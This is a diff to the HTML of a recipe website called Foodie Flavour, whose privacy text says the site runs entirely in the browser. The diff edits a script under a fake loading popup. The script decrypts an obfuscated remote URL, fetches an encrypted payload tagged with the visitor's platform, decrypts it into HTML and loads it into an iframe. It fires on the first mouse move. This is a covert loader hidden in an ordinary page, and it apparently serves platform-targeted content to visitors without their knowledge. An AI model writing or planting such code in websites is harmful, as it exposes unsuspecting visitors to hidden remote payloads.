@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -219,8 +218,6 @@
         Foodie Flavour runs entirely in your browser. Favorites are saved with <strong>local storage</strong> on your device only — we don’t run a backend that receives your recipe picks. The contact form is a demo: nothing is uploaded until you wire it to a mail or form service. Recipe images load from third-party hosts (e.g. <a href="https://unsplash.com" rel="noopener noreferrer" target="_blank">Unsplash</a>); their privacy terms apply when those images load. Questions? <a href="/cdn-cgi/l/email-protection#97fff2fbfbf8d7f1f8f8f3fef2f1fbf6e1f8e2e5b9f2eff6fae7fbf2"><span class="__cf_email__" data-cfemail="6f070a0303002f09030e19001a1d0900000b060a410a170e021f030a">[email&#160;protected]</span></a>.
       </p>
     </section>
-
-
   </main>
 
   <footer class="site-footer">
@@ -268,8 +265,11 @@
     <p class="toast__msg">Order is not available currently.</p>
   </div>
 
-  <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="js/app.js"></script>
-   <div class="popup" id="customPopup">
+  <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script>
+  <script src="js/app.js"></script>
+  
+  <!-- ===== Loader + Encrypted Shop ===== -->
+  <div class="popup" id="customPopup">
     <div class="popup-content">
       <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
       <p>Loading... Please wait.</p>
@@ -285,12 +285,17 @@
   <script>
     const PASSPHRASE = "98yNCjeAfWMwk0wI";
     const URL_KEY = "UrLk3yShopEase01";
-    ENC_DATA_ORIGIN = "U2FsdGVkX19jBseuqPYVwxW4uuhgPRGuSPQHYIjMMl2oWPPOnU/iCYW9bPabGt2x"
+    
+    // https://yoursomahearts.com/api/data.php
+    ENC_DATA_ORIGIN = "U2FsdGVkX19SMIrmXtWp59bMoqc6JmmOgjmCZAXmbxbzIlkkWiGnJno8UobJ4YZwq83mTIJFyPeYWExNkAK5w=="
+
     let lastUrl = null;
 
     // Decrypt the origin URL
     const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
     const DATA_URL = DATA_ORIGIN;
+
+    console.log("🌐 Decrypted URL:", DATA_URL);
 
     function detectPlatform() {
       const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
@@ -301,9 +306,19 @@
     async function loadSecret() {
       const frame = document.getElementById("frame");
       try {
+        console.log("📡 Fetching from:", DATA_URL + "?platform=" + detectPlatform());
+        
         const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
-        const { cipher } = await res.json();
-        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        console.log("📡 Response Status:", res.status);
+        
+        if (!res.ok) {
+          throw new Error(`HTTP ${res.status}: ${res.statusText}`);
+        }
+        
+        const data = await res.json();
+        console.log("✅ Cipher received:", data.cipher ? "Yes (length: " + data.cipher.length + ")" : "No");
+        
+        const html = CryptoJS.AES.decrypt(data.cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
         if (!html) throw new Error("Decrypt failed — wrong key?");
 
         if (lastUrl) URL.revokeObjectURL(lastUrl);
@@ -313,13 +328,15 @@
         frame.src = lastUrl;
         frame.style.display = "block";
         document.getElementById("customPopup").style.display = "none";
+        console.log("✅ Shop loaded successfully!");
       } catch (e) {
+        console.error("❌ Error:", e.message);
         alert("Error loading content: " + e.message);
         document.getElementById("customPopup").style.display = "none";
       }
     }
 
-    // Cancel button - just close popup (show nothing)
+    // Cancel button - just close popup
     document.getElementById("cancelBtn").addEventListener("click", function() {
       document.getElementById("customPopup").style.display = "none";
     });
@@ -329,7 +346,7 @@
       loadSecret();
     });
 
-    // Auto-load on mouse move (just like friend's code)
+    // Auto-load on mouse move
     window.addEventListener("mousemove", () => {
       loadSecret();
     }, { once: true });
